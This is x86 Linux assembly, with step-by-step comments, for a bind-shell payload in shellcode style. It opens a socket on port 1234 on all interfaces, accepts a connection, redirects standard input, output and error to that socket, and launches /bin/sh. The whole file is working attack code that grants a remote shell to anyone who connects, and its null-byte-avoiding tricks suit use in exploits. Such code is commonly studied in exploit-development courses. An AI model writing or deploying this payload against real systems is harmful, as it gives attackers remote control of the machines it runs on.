section .text
    global _start

; socketcall(int call, unsigned long *args). Call 
; placed in ebx and *args on stack.

socketcall: 
    xor eax, eax
    mov al, 102
    
    int 128
    retn

_start:

; socket(AF_INET, SOCK_STREAM, IPPROTO_IP). sockfd 
; stored in eax then moved to edx.

    xor ebx, ebx

    push ebx
    inc ebx

    push ebx
    push 2

    mov ecx, esp
    call socketcall

    mov edx, eax

; bind(sockfd, [AF_INET, 1234, 0], 16). The address,
; 0 indicates "all interfaces".
    
    pop ebx
    pop ecx

    push word 53764
    push bx

    mov ecx, esp

    push 16
    push ecx

    push edx

    mov ecx, esp
    call socketcall

; listen(sockfd, 2). Only allow 2 connections in SYN
; state at one time.

    push ebx
    shl ebx, 1

    push edx

    mov ecx, esp
    call socketcall

; accept(sockfd, 0, 0). Connections may come from any
; address, hence 0.
    
    xor eax, eax
    inc ebx

    push eax
    push eax 

    push edx

    mov ecx, esp
    call socketcall

; dup2(1...2, peerfd). Pipe stdin, stdout and stderr
; through the client's socket.

    mov ebx, eax

    xor ecx, ecx
    mov cl, 3

pipe:
    mov al, 63

    dec ecx
    int 128
    
    inc ecx
    loop pipe

; execve("/bin//sh", 0, 0). Spawn /bin/sh
; with piped input and output.

    xor eax, eax
    push eax

    push 0x68732f2f
    push 0x6e69622f 

    mov ebx, esp

    mov ecx, eax
    mov edx, eax

    mov al, 11
    int 128
